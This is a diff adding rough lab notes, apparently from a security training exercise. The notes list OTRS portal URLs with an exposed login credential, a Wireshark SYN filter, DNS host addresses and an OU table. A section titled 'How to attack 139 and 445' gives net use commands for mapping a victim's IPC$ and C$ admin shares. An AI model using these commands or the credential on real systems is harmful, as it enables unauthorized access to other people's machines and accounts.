@@ -1,0 +1,53 @@
+http://socir.rivanit.com/otrs/customer.pl
+http://208.8.8.133/otrs/customer.pl
+user1/
+C1sc0123
+
+WIRESHARK
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+
+
+
+
+Victim's IP 10.3.3.181
+Should be connected to the same network
+
+
+How to attack 139 and 445
+
+net use x: /delete
+
+net use \\10.3.3.181\ipc$ /user:administrator
+
+or net use \\10.3.3.181\ipc$
+~~access victim's IP/computer
+
+net use x: \\10.3.3.181\c$
+~~assign c drive to your drive x
+
+netstart -n -p tcp
+~para makita sino mga nakapasok na sa drive/computer mo
+
+
+
+configuring secure DNS
+
+ct 10.82.1.2
+cb 10.82.1.4
+cm 10.82.100.8
+c6 10.82.50.6
+c8 10.82.50.8
+p1 10.82.100.101
+p2 10.82.100.102
+
+
+identity and access management
+
+OU	USERS	GLOBALGROUP	LOCALGROUP
+
+HRD
+ACT
+ADM
+SOC
+NOC
